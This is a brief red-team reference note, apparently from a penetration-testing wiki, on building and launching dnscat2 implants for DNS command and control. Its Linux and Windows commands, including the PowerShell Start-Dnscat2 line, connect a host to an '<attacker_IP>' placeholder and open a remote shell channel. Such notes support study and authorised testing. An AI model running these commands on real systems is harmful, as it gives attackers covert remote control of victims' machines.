# Implants

Search Tag(s): #dnscat2 #command-and-control #interactive-shell

TODO: Provide a usage example with dnscat2

## Compile Implant

### Linux

```
$ cd dnscat2/client/ && make
```

### Windows

```
C:\> dnscat2-win32.exe --host <attacker_IP>
```

```
PS C:\> Start-Dnscat2 -Domain <domain>.<tld> -DNSServer <attacker_IP>
```

---
## References

- [lukebaggett: DNSCat2 PowerShell Implant](https://github.com/lukebaggett/dnscat2-powershell)

- [avitex: Rust DNSCat](https://github.com/avitex/rust-dnscat)

- [Pentestlab Blog: Command and Control - DNS](https://pentestlab.blog/2017/09/06/command-and-control-dns/)